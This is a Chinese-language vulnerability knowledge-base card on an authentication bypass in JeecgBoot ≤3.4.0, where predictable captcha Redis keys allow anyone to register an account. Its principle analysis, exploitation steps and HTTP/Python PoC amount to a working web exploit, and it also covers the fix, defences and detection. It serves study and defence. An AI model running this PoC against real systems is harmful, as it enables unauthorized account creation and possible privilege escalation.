---
id: web-java-framework-jeecgboot-captcha-redis-key-reuse-register
title: JeecgBoot ≤3.4.0 验证码 Redis Key 复用导致任意用户注册
type: scenario
domain: web
path: web/java/framework
technique: jeecgboot-captcha-redis-key-reuse
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- java
- jeecgboot
- spring-boot
- captcha
- redis
- auth-bypass
- logic-flaw
- registration
cve: []
affected_versions: ≤3.4.0（3.4.2 修复）
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:32:56+08:00'
  notes: 已对照原文与源码截图核对 /register redis.get(phone) 校验、/randomImage/{key} 的 MD5(lowerCaseCode+key) 写入及 3.4.0→3.4.2 修复 diff；未验证点：原文无真实请求/响应，复现结果由源码推导；修复 diff 截图主要展示 login() 与 sms() 改动，randomImage 具体改动未直接展示
url: /docs/web/java/framework/web-java-framework-jeecgboot-captcha-redis-key-reuse-register/
draft: false
kb_aliases:
- JeecgBoot 任意用户注册
- JeecgBoot 验证码逻辑缺陷
- Redis key 复用注册绕过
- randomImage 验证码绕过
- 短信验证码绕过注册
- VUEN-2245
---

## 一句话结论

JeecgBoot ≤3.4.0 的 `/register` 直接把用户提交的 `phone` 当作 Redis key 取短信验证码，而图形验证码接口 `/randomImage/{key}` 又把 `MD5(验证码 + 用户可控 key)` 作为 Redis key、把验证码本身作为 value 写入同一个命名空间；攻击者从图片读出验证码后即可自行算出 key，再把二者分别填进 `phone` 与 `smscode`，在未收到任何短信的情况下完成注册。

## 原理

- 注册接口的校验逻辑：
  ```java
  Object code = redisUtil.get(phone);           // phone 完全由请求体控制
  if (null == code) { /* 验证码失效 */ }
  if (!smscode.equals(code.toString())) { /* 验证码错误 */ }
  ```
  `phone` 是攻击者可控的 Redis key，`smscode` 是攻击者可控的比对值；只要能找到一个“key 已知、value 已知”的 Redis 记录，就能构造出通过校验的 `phone`/`smscode` 组合。
- 图形验证码接口：
  ```java
  String code = RandomUtil.randomString(BASE_CHECK_CODES, 4);
  String lowerCaseCode = code.toLowerCase();
  String realKey = Md5Util.md5Encode(lowerCaseCode + key, "utf-8");
  redisUtil.set(realKey, lowerCaseCode, 60);    // 60 秒过期
  String base64 = RandImageUtil.generate(code); // 图片返回前端
  ```
  其中 `key` 是路径参数、攻击者自选；`lowerCaseCode` 是 4 位随机码，但会以图片形式返回，攻击者读取图片即可得知；`realKey` 是两者的 MD5，攻击者可本地计算；value 就是 `lowerCaseCode`。因此该接口产生的 key-value 对**对攻击者完全已知**。
- 两个接口共用同一 Redis 实例/命名空间，注册接口没有区分“短信验证码”与“图形验证码”的来源，也没有把验证码与手机号或业务用途绑定。攻击者把图形验证码的 key 冒充手机号传给注册接口，校验便通过。
- 根因是**验证码的 key 生成可预测且跨业务复用**：key 只由“服务端随机码 + 用户可控字符串”组成，缺少服务端秘密因子；不同业务使用同一 key 空间，导致一个业务写入的验证码可被另一个业务消费。
- 注册成功后，可再结合权限提升问题（issue #5270，接口可通过 roleId/userId 关联角色）将新用户绑定到管理员组；该组合链为公开信息，但本文未给出复现细节。

## 触发条件

1. 目标为 JeecgBoot ≤3.4.0（3.4.2 已修复）。
2. `/sys/randomImage/{key}` 接口可匿名访问，`/sys/register` 开放注册。
3. 图形验证码的 Redis key 仍按 `MD5(lowerCaseCode + key)` 生成，且与短信验证码共用命名空间。
4. 目标启用了 Redis 验证码存储（默认配置即满足；线上未配置真实短信发送也能成立）。

## 利用步骤

1. 选择一个自选字符串作为路径参数，例如 `attackKey`。
2. 请求 `GET /jeecg-boot/sys/randomImage/attackKey`，拿到 base64 图片并识别 4 位验证码（如 `abcd`）。
3. 本地计算 `realKey = MD5("abcd" + "attackKey")`。
4. 向 `/jeecg-boot/sys/register` 提交 JSON，把 `phone` 设为该 MD5、`smscode` 设为 `abcd`，并填写用户名/密码/邮箱。
5. 服务端 `redisUtil.get(phone)` 取到 `abcd`，与 `smscode` 相同，验证通过，注册成功。
6. 如目标存在 issue #5270 的权限提升问题，可继续将新账号绑定到管理员角色。

## PoC

获取并解码图形验证码：

```http
GET /jeecg-boot/sys/randomImage/attackKey HTTP/1.1
Host: target.com
```

```json
{
  "success": true,
  "code": 200,
  "result": "data:image/jpg;base64,/9j/4AAQSkZJRgABAQAAAQ..."
}
```

计算 Redis key：

```python
import hashlib
lowerCaseCode = "abcd"        # 从图片识别
key = "attackKey"             # 自选路径参数
realKey = hashlib.md5((lowerCaseCode + key).encode()).hexdigest()
print(realKey)                # 例如 e99a18c428cb38d5f260853678922e03
```

构造注册请求：

```http
POST /jeecg-boot/sys/register HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "phone": "e99a18c428cb38d5f260853678922e03",
  "smscode": "abcd",
  "username": "attacker",
  "password": "Attacker@123",
  "email": "attacker@evil.com"
}
```

预期响应：

```json
{"success": true, "message": "注册成功", "code": 200,
 "result": {"userId": "123456789", "username": "attacker"}}
```

官方修复 diff 显示：图形验证码 key 改为 `MD5(lowerCaseCode + key + jeecgBaseConfig.getSignatureSecret())`，短信验证码 key 改为 `PHONE_REDIS_KEY_PRE + mobile`，即加入服务端秘密因子并做业务前缀隔离。

## 变体与关联

- 同类缺陷不限于 JeecgBoot：任何“验证码 key 由用户可控值 + 可预测/可读取的随机码构成”且跨业务共用 Redis 命名空间的实现，都可用相同思路把图形验证码当短信验证码使用。
- `phone` 字段未做手机号格式校验（接受 32 位 MD5）也是必要条件；若注册接口严格校验手机号格式，该手法会被阻断。
- 组合利用：任意注册 → issue #5270 角色绑定/权限提升 → 后台 RCE（原文仅提及，未给 PoC）。
- 与“验证码复用/一次性校验缺失”类认证绕过同属业务逻辑缺陷，但本卡的核心是**存储 key 可预测 + 命名空间未隔离**。

## 检测与防御

- 升级到 3.4.2+（彻底修复）或最新版本；无法升级时关闭开放注册（`jeecg.open-register: false`）或对注册接口加 IP 白名单。
- 验证码 key 加入服务端秘密因子（如签名密钥/随机盐），禁止仅由用户可控值与可读取验证码推导；不同业务使用独立前缀（登录、短信、注册等）。
- 验证码与手机号/业务场景绑定，校验成功后立即删除（一次性），并设置合理的 TTL 与失败次数限制。
- 注册接口校验手机号格式；敏感接口加 `@RequiresPermissions` 与访问控制。
- 监控异常注册：`phone` 字段非手机号格式、短时间大量注册、同一 IP 反复请求 `/randomImage/*`。
